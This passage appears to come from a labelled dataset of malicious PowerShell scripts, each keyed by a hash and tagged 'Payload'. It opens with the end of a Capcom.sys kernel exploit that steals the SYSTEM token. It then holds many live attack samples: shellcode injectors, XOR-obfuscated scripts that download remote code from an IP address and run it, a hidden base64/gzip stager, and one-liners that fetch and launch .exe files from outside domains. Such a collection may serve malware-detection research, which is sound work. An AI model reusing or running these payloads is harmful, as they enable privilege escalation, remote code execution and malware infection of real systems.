					$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) 
					break
				}
			}
			Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
		}
	
		$BitMapObject = @()
		$HashTable = @{
			BitmapHandle = $BitmapHandle
			BitmapKernelObj = $($KernelArray[$i].KernelObj)
			BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
		}
		$Object = New-Object PSObject -Property $HashTable
		$BitMapObject += $Object
		$BitMapObject
	}
	
	function Bitmap-Read {
		param ($Address)
		$CallResult = [CapCom]::SetBitmapBits($Manager.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		[IntPtr]$Pointer = [CapCom]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
		$CallResult = [CapCom]::GetBitmapBits($Worker.BitmapHandle, [System.IntPtr]::Size, $Pointer)
		if ($x32Architecture){
			[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
		} else {
			[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
		}
		$CallResult = [CapCom]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
	}
	
	function Bitmap-Write {
		param ($Address, $Value)
		$CallResult = [CapCom]::SetBitmapBits($Manager.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		$CallResult = [CapCom]::SetBitmapBits($Worker.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
	}
	
	
	$PwnBanner = @""

+---------------------------------------------------+
|           \\                          ___/________ |
|      ___   )          ,  @             /    \\  \\  |
|   @___, \\ /        @__\\  /\\       @___/      \\@/  |
|  /\\__,   |        /\\_, \\/ /      /\\__/        |   |
| / \\    / @\\      / \\   (        / \\ /        / \\  |
|/__|___/___/_____/__|____\\______/__/__________|__\\_|
|                                                   |
|                 Street Fighter V                  |
|            Capcom.sys LPE => 7-10 x64             |
|                                                   |
|                                 ~b33f (@FuzzySec) |
+---------------------------------------------------+
""@
	$PwnBanner

	
	
	echo ""`n[>] gSharedInfo bitmap leak..""
	$Manager = Stage-gSharedInfoBitmap
	$Worker = Stage-gSharedInfoBitmap
	echo ""[+] Manager bitmap Kernel address: 0x$(""{0:X16}"" -f $($Manager.BitmapKernelObj))""
	echo ""[+] Worker bitmap Kernel address: 0x$(""{0:X16}"" -f $($Worker.BitmapKernelObj))""
	
	
	[Byte[]] $Shellcode = @(
		0x48, 0xB8) + [System.BitConverter]::GetBytes($Manager.BitmappvScan0) + @( 
		0x48, 0xB9) + [System.BitConverter]::GetBytes($Worker.BitmappvScan0)  + @( 
		0x48, 0x89, 0x08,                                                          
		0xC3                                                                       
	)

	
	
	echo ""`n[>] Allocating Capcom payload..""
	[IntPtr]$Pointer = [CapCom]::VirtualAlloc([System.IntPtr]::Zero, (8 + $Shellcode.Length), 0x3000, 0x40)
	$ExploitBuffer = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8) + $Shellcode
	[System.Runtime.InteropServices.Marshal]::Copy($ExploitBuffer, 0, $Pointer, (8 + $Shellcode.Length))
	echo ""[+] Payload size: $(8 + $Shellcode.Length)""
	echo ""[+] Payload address: $(""{0:X}"" -f $Pointer.ToInt64())""
	
	$hDevice = [CapCom]::CreateFile(""\\\\.\\Htsysm72FB"", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)

	if ($hDevice -eq -1) {
		echo ""`n[!] Unable to get driver handle..`n""
		Return
	} else {
		echo ""`n[>] Driver information..""
		echo ""[+] lpFileName: \\\\.\\Htsysm72FB""
		echo ""[+] Handle: $hDevice""
	}
	
	
	
	$InBuff = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8)
	$OutBuff = 0x1234
	echo ""`n[>] Sending buffer..""
	echo ""[+] Buffer length: $($InBuff.Length)""
	echo ""[+] IOCTL: 0xAA013044""
	[CapCom]::DeviceIoControl($hDevice, 0xAA013044, $InBuff, $InBuff.Length, [ref]$OutBuff, 4, [ref]0, [System.IntPtr]::Zero) |Out-null

	
	
	$SystemModuleArray = Get-LoadedModules

	
	
	
	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
	$OSMajorMinor = ""$($OSVersion.Major).$($OSVersion.Minor)""
	switch ($OSMajorMinor)
	{
		'10.0' 
		{
			$UniqueProcessIdOffset = 0x2e8
			$TokenOffset = 0x358          
			$ActiveProcessLinks = 0x2f0
		}
	
		'6.3' 
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348          
			$ActiveProcessLinks = 0x2e8
		}
	
		'6.2' 
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348          
			$ActiveProcessLinks = 0x2e8
		}
	
		'6.1' 
		{
			$UniqueProcessIdOffset = 0x180
			$TokenOffset = 0x208          
			$ActiveProcessLinks = 0x188
		}
	}

	
	echo ""`n[>] Leaking SYSTEM _EPROCESS..""
	$KernelBase = $SystemModuleArray[0].ImageBase
	$KernelType = ($SystemModuleArray[0].ImageName -split ""\\\\"")[-1]
	$KernelHanle = [CapCom]::LoadLibrary(""$KernelType"")
	$PsInitialSystemProcess = [CapCom]::GetProcAddress($KernelHanle, ""PsInitialSystemProcess"")
	$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
	$CallResult = [CapCom]::FreeLibrary($KernelHanle)
	echo ""[+] _EPORCESS list entry: 0x$(""{0:X}"" -f $SysEprocessPtr)""
	$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
	echo ""[+] SYSTEM _EPORCESS address: 0x$(""{0:X}"" -f $(Bitmap-Read -Address $SysEprocessPtr))""
	echo ""[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))""
	echo ""[+] SYSTEM Token: 0x$(""{0:X}"" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))""
	$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
	
	
	echo ""`n[>] Leaking current _EPROCESS..""
	echo ""[+] Traversing ActiveProcessLinks list""
	$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	while($true) {
		$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
		if ($NextPID -eq $PID) {
			echo ""[+] PowerShell _EPORCESS address: 0x$(""{0:X}"" -f $NextProcess)""
			echo ""[+] PID: $NextPID""
			echo ""[+] PowerShell Token: 0x$(""{0:X}"" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))""
			$PoShTokenAddr = $NextProcess+$TokenOffset
			break
		}
		$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	}
	
	
	echo ""`n[!] Duplicating SYSTEM token!`n""
	Bitmap-Write -Address $PoShTokenAddr -Value $SysToken
}",Payload
d9e8d274d807c46fc38fb576a7df7907f34e1c28722b05eda7e853f21f21795e,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x22,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
5e5b2cb5aaeb838956cdd08f40a3f13f9ce6f23d53cb743e3ea1fc221e1d124e,"
[SystEm.NET.SeRvIcEPoInTMaNAGeR]::EXPEct100CoNTINue = 0;$wc=New-ObjeCt SYsTEM.NEt.WEbClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdERS.AdD('User-Agent',$u);$Wc.PrOxY = [SyStem.NET.WEBREQUEST]::DeFauLTWebPRoXY;$wc.PRoxY.CreDentiALs = [SYsTEm.NET.CRedENTiaLCacHe]::DeFAUltNeTWORkCReDENtiALs;$K='63a9f0ea7bb98050796b649e85481845';$I=0;[chAR[]]$b=([ChAR[]]($Wc.DownloADSTRinG(""http://138.121.170.12:500/index.asp"")))|%{$_-BXor$K[$i++%$K.Length]};IEX ($b-joIn'')

",Payload
fda44f43ded0f560f7f87ba50fbc47e11ad70b3294fec659e9f101b6e67db977,"
$evz = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $evz -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x30,0x94,0xb4,0xad,0xdb,0xc6,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x13,0x83,0xc6,0x04,0x03,0x56,0x3f,0x76,0x41,0x51,0xd7,0xf4,0xaa,0xaa,0x27,0x99,0x23,0x4f,0x16,0x99,0x50,0x1b,0x08,0x29,0x12,0x49,0xa4,0xc2,0x76,0x7a,0x3f,0xa6,0x5e,0x8d,0x88,0x0d,0xb9,0xa0,0x09,0x3d,0xf9,0xa3,0x89,0x3c,0x2e,0x04,0xb0,0x8e,0x23,0x45,0xf5,0xf3,0xce,0x17,0xae,0x78,0x7c,0x88,0xdb,0x35,0xbd,0x23,0x97,0xd8,0xc5,0xd0,0x6f,0xda,0xe4,0x46,0xe4,0x85,0x26,0x68,0x29,0xbe,0x6e,0x72,0x2e,0xfb,0x39,0x09,0x84,0x77,0xb8,0xdb,0xd5,0x78,0x17,0x22,0xda,0x8a,0x69,0x62,0xdc,0x74,0x1c,0x9a,0x1f,0x08,0x27,0x59,0x62,0xd6,0xa2,0x7a,0xc4,0x9d,0x15,0xa7,0xf5,0x72,0xc3,0x2c,0xf9,0x3f,0x87,0x6b,0x1d,0xc1,0x44,0x00,0x19,0x4a,0x6b,0xc7,0xa8,0x08,0x48,0xc3,0xf1,0xcb,0xf1,0x52,0x5f,0xbd,0x0e,0x84,0x00,0x62,0xab,0xce,0xac,0x77,0xc6,0x8c,0xb8,0xb4,0xeb,0x2e,0x38,0xd3,0x7c,0x5c,0x0a,0x7c,0xd7,0xca,0x26,0xf5,0xf1,0x0d,0x49,0x2c,0x45,0x81,0xb4,0xcf,0xb6,0x8b,0x72,0x9b,0xe6,0xa3,0x53,0xa4,0x6c,0x34,0x5c,0x71,0x18,0x31,0xca,0xba,0x75,0x38,0x22,0x53,0x84,0x3b,0x33,0x1f,0x01,0xdd,0x63,0x0f,0x42,0x72,0xc3,0xff,0x22,0x22,0xab,0x15,0xad,0x1d,0xcb,0x15,0x67,0x36,0x61,0xfa,0xde,0x6e,0x1d,0x63,0x7b,0xe4,0xbc,0x6c,0x51,0x80,0xfe,0xe7,0x56,0x74,0xb0,0x0f,0x12,0x66,0x24,0xe0,0x69,0xd4,0xe2,0xff,0x47,0x73,0x0a,0x6a,0x6c,0xd2,0x5d,0x02,0x6e,0x03,0xa9,0x8d,0x91,0x66,0xa2,0x04,0x04,0xc9,0xdc,0x68,0xc8,0xc9,0x1c,0x3f,0x82,0xc9,0x74,0xe7,0xf6,0x99,0x61,0xe8,0x22,0x8e,0x3a,0x7d,0xcd,0xe7,0xef,0xd6,0xa5,0x05,0xd6,0x11,0x6a,0xf5,0x3d,0xa0,0x56,0x20,0x7b,0xd6,0xb6,0xf0;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$0pT8=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($0pT8.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$0pT8,0,0,0);for (;;){Start-sleep 60};

",Payload
9a7d38e41693a7377451ae328ea0a9c091bd59aa6f74f3c9937476c80a9db227,"
$abqS = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $abqS -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xd8,0x6d,0x60,0x70,0xd9,0xc9,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x4e,0x31,0x70,0x13,0x03,0x70,0x13,0x83,0xc0,0xdc,0x8f,0x95,0x8c,0x34,0xcd,0x56,0x6d,0xc4,0xb2,0xdf,0x88,0xf5,0xf2,0x84,0xd9,0xa5,0xc2,0xcf,0x8c,0x49,0xa8,0x82,0x24,0xda,0xdc,0x0a,0x4a,0x6b,0x6a,0x6d,0x65,0x6c,0xc7,0x4d,0xe4,0xee,0x1a,0x82,0xc6,0xcf,0xd4,0xd7,0x07,0x08,0x08,0x15,0x55,0xc1,0x46,0x88,0x4a,0x66,0x12,0x11,0xe0,0x34,0xb2,0x11,0x15,0x8c,0xb5,0x30,0x88,0x87,0xef,0x92,0x2a,0x44,0x84,0x9a,0x34,0x89,0xa1,0x55,0xce,0x79,0x5d,0x64,0x06,0xb0,0x9e,0xcb,0x67,0x7d,0x6d,0x15,0xaf,0xb9,0x8e,0x60,0xd9,0xba,0x33,0x73,0x1e,0xc1,0xef,0xf6,0x85,0x61,0x7b,0xa0,0x61,0x90,0xa8,0x37,0xe1,0x9e,0x05,0x33,0xad,0x82,0x98,0x90,0xc5,0xbe,0x11,0x17,0x0a,0x37,0x61,0x3c,0x8e,0x1c,0x31,0x5d,0x97,0xf8,0x94,0x62,0xc7,0xa3,0x49,0xc7,0x83,0x49,0x9d,0x7a,0xce,0x05,0x52,0xb7,0xf1,0xd5,0xfc,0xc0,0x82,0xe7,0xa3,0x7a,0x0d,0x4b,0x2b,0xa5,0xca,0xac,0x06,0x11,0x44,0x53,0xa9,0x62,0x4c,0x97,0xfd,0x32,0xe6,0x3e,0x7e,0xd9,0xf6,0xbf,0xab,0x4e,0xa7,0x6f,0x04,0x2f,0x17,0xcf,0xf4,0xc7,0x7d,0xc0,0x2b,0xf7,0x7d,0x0b,0x44,0x10,0x90,0xb3,0x6b,0xe1,0xf7,0xd7,0x04,0x92,0xc3,0x27,0xeb,0x7a,0x48,0x23,0x65,0xf0,0xbe,0xc5,0x1c,0x82,0xbe,0x71,0x76,0x42,0x8b,0x01,0x77,0x46,0x78,0x41,0x94,0x03,0x7a,0x11,0xcc,0xd1,0x84,0x8e,0x9d,0x5f,0x62,0xda,0x8d,0x09,0x3c,0x72,0x37,0x10,0xb6,0xe3,0xb8,0x8e,0xb2,0x23,0x32,0x3d,0x42,0xed,0xb3,0x48,0x50,0x99,0x33,0x07,0x0a,0x0f,0x4b,0xbd,0x21,0xaf,0xd9,0x3a,0xe0,0xf8,0x75,0x41,0xd5,0xce,0xd9,0xba,0x30,0x45,0xd3,0x2e,0xfb,0x31,0x1c,0xbf,0xfb,0xc1,0x4a,0xd5,0xfb,0xa9,0x2a,0x8d,0xaf,0xcc,0x34,0x18,0xdc,0x5d,0xa1,0xa3,0xb5,0x32,0x62,0xcc,0x3b,0x6d,0x44,0x53,0xc3,0x58,0x54,0xaf,0x12,0xa4,0x22,0xc1,0xa6;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Ai4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Ai4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Ai4,0,0,0);for (;;){Start-sleep 60};

",Payload
235d46ec64bbe664428d269fd54ef7e275311a728e40ee38bf4605f4c35dbd45,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''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''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
093fbf227f303e8b42e5c9a519ad9dfe799b27042020705a2d612766fc53f147,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/yhggkj.exe',""$env:TEMP\\payment.exe"");Start-Process (""$env:TEMP\\payment.exe"")

",Payload
c55475f70ebff900f7c036b0371c7615742b30a2325b1b161eb9097eb2e4f700,"
(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/spe/spendy.exe',""$env:TEMP\\spendy.exe"");Start-Process (""$env:TEMP\\spendy.exe"")

",Payload
f74f3c2107b8cb9c30a44fce03ac50133eae5c874474249abbfafadff683c215,"
[SYsTEM.NeT.SErViCePOINTMANageR]::EXpeCT100CONtinUE = 0;$WC=NEW-ObjeCt SyStEm.NET.WebClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEaDeRs.AdD('User-Agent',$u);$wC.ProXy = [SYsTEM.NeT.WEbREQUEst]::DEfaULTWEbProXy;$wc.PrOXY.CredENtIaLs = [SyStEm.NEt.CrEDEnTIALCACHE]::DEfAUlTNETWOrkCREdENTIALs;$K='63a9f0ea7bb98050796b649e85481845';$I=0;[char[]]$B=([chaR[]]($wc.DOwnloADStrInG(""http://138.121.170.12:3133/index.asp"")))|%{$_-bXor$k[$I++%$K.LeNgth]};IEX ($b-jOIn'')

",Payload
1a60439df765981e01bf0f25b828be9c201f0488258cb60349116e2e6dbb880b,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd4,0xd9,0x74,0x24,0xf4,0xbf,0xba,0x38,0x46,0xe9,0x5a,0x33,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x7a,0x14,0x03,0x7a,0xae,0xda,0xb3,0x15,0x26,0x98,0x3c,0xe6,0xb6,0xfd,0xb5,0x03,0x87,0x3d,0xa1,0x40,0xb7,0x8d,0xa1,0x05,0x3b,0x65,0xe7,0xbd,0xc8,0x0b,0x20,0xb1,0x79,0xa1,0x16,0xfc,0x7a,0x9a,0x6b,0x9f,0xf8,0xe1,0xbf,0x7f,0xc1,0x29,0xb2,0x7e,0x06,0x57,0x3f,0xd2,0xdf,0x13,0x92,0xc3,0x54,0x69,0x2f,0x6f,0x26,0x7f,0x37,0x8c,0xfe,0x7e,0x16,0x03,0x75,0xd9,0xb8,0xa5,0x5a,0x51,0xf1,0xbd,0xbf,0x5c,0x4b,0x35,0x0b,0x2a,0x4a,0x9f,0x42,0xd3,0xe1,0xde,0x6b,0x26,0xfb,0x27,0x4b,0xd9,0x8e,0x51,0xa8,0x64,0x89,0xa5,0xd3,0xb2,0x1c,0x3e,0x73,0x30,0x86,0x9a,0x82,0x95,0x51,0x68,0x88,0x52,0x15,0x36,0x8c,0x65,0xfa,0x4c,0xa8,0xee,0xfd,0x82,0x39,0xb4,0xd9,0x06,0x62,0x6e,0x43,0x1e,0xce,0xc1,0x7c,0x40,0xb1,0xbe,0xd8,0x0a,0x5f,0xaa,0x50,0x51,0x37,0x1f,0x59,0x6a,0xc7,0x37,0xea,0x19,0xf5,0x98,0x40,0xb6,0xb5,0x51,0x4f,0x41,0xba,0x4b,0x37,0xdd,0x45,0x74,0x48,0xf7,0x81,0x20,0x18,0x6f,0x20,0x49,0xf3,0x6f,0xcd,0x9c,0x6e,0x75,0x59,0xa1,0xef,0x95,0xb3,0xb5,0xed,0x55,0xe7,0xf4,0x7b,0xb3,0xb7,0xa6,0x2b,0x6c,0x77,0x17,0x8c,0xdc,0x1f,0x7d,0x03,0x02,0x3f,0x7e,0xc9,0x2b,0xd5,0x91,0xa4,0x04,0x41,0x0b,0xed,0xdf,0xf0,0xd4,0x3b,0x9a,0x32,0x5e,0xc8,0x5a,0xfc,0x97,0xa5,0x48,0x68,0x58,0xf0,0x33,0x3e,0x67,0x2e,0x59,0xbe,0xfd,0xd5,0xc8,0xe9,0x69,0xd4,0x2d,0xdd,0x35,0x27,0x18,0x56,0xff,0xbd,0xe3,0x00,0x00,0x52,0xe4,0xd0,0x56,0x38,0xe4,0xb8,0x0e,0x18,0xb7,0xdd,0x50,0xb5,0xab,0x4e,0xc5,0x36,0x9a,0x23,0x4e,0x5f,0x20,0x1a,0xb8,0xc0,0xdb,0x49,0x38,0x3c,0x0a,0xb7,0x4e,0x2c,0x8e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
28ed8934f9387fde33d2a19029180008efc7572e4427f0e032f13550a3c1039a,"
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://alonqood.com/nano.exe', $dpl);Start-Process $dpl

",Payload
7ae8dc8183d5635e073c55c54b4e07087a7b3f632bd7f87b40df9080e9b202f1,"
